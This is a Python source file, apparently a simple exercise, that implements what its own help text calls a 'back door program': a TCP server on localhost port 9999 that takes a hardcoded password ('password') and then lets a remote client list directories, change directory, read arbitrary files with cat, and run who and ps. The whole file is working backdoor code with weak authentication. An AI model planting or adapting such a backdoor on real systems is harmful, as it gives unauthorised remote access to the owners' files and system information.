import os
import socketserver
import socket, threading
import subprocess

password = "password"
passwordRequest = "Please enter the password\n"
incorrectPw = "Incorrect password\n"
welcome = "Welcome back!\n"

def cat_com(fileName):
    with open(fileName, "r") as myfile:
        data = myfile.readlines()
    return("\n".join(data)+"\n")

def ls_com():
    resp = os.listdir(os.getcwd())
    return ("\n".join(resp)+"\n")

def pwd_com():
    resp = os.getcwd()
    return (resp+"\n")

#assumed that the path is relative
def cd_com(relPath):
    cwd=os.getcwd()
    path=os.chdir(os.path.join(cwd,relPath))
    return("dir changed\n")

def hlp_com():
    return ("pwd - returns current working directory\ncd <dir> - changes currentworking directory to <dir>\n"
            + "ls - list content of the curent working directory\ncat <file> - return contents of the file\n"
            +"off - terminates the back door program\n")

def who_com():
    return(subprocess.check_output(["/bin/who"]).decode("utf-8"))

def ps_com():
    return (subprocess.check_output(["/bin/ps"]).decode("utf-8"))

def off_com():
    return ("client disconnect\n")

class MyTCPHandler(socketserver.BaseRequestHandler):
   BUFFER_SIZE = 4096
   def handle(self):
       print("hi")
       authorized = False
       self.request.sendall(bytearray(passwordRequest, "UTF-8"))

       while 1:
           data = self.request.recv(self.BUFFER_SIZE)
           if len(data) == self.BUFFER_SIZE:
               while 1:
                   try:  # error means no more data
                       data += self.request.recv(self.BUFFER_SIZE, socket.MSG_DONTWAIT)
                   except:
                       break

           if len(data) == 0:
               continue
           data = data.decode( "utf-8")

           if not authorized:
               authorized = (data == password)
               if not authorized:
                   print(data)
                   self.request.sendall(bytearray(incorrectPw, "UTF-8"))
                   continue
               else:
                   self.request.sendall(bytearray(welcome, "UTF-8"))
                   continue

           command = data.split()  # splits on space and \n

           if data.startswith('ls'):
               response = ls_com()
           elif data.startswith('pwd'):
               response = pwd_com()
           elif data.startswith('help'):
               response = hlp_com()
           elif data.startswith('who'):
               response = who_com()
           elif data.startswith('ps'):
               response = ps_com()
           elif data.startswith('off'):
               response = off_com()
           elif data.startswith('cd'):
               response = cd_com(command[1])
           elif data.startswith('cat'):
               response = cat_com(command[1])
           else:
               response = "command not found\n"

           #dir = ""
           #try:
           #    data,dir=data.split(" ")
           #    dir=dir.rstrip('\n')
           #except ValueError:
           #    print("\n")

           #option = {'ls\n': ls_com,
           #          'pwd\n': pwd_com,
           #          'help\n': hlp_com,
           #          'who\n':who_com,
           #          'ps\n':ps_com,
           #          'off\n':off_com,
           #          'cd':cd_com,
           #          'cat':cat_com}

           #if dir:
           # response = option[data](dir)
           #else:
           # response = option[data]()

           self.request.sendall(bytearray(response,"UTF-8"))
           #print("%s (%s) wrote: %s" % (self.client_address[0],
           #      threading.currentThread().getName(), data.strip()))
           print(response)
           if(response=="client disconnect\n"):
               print("bye")
               break


if __name__ == "__main__":
   HOST, PORT = "localhost", 9999
   server = socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler)
   server.serve_forever()


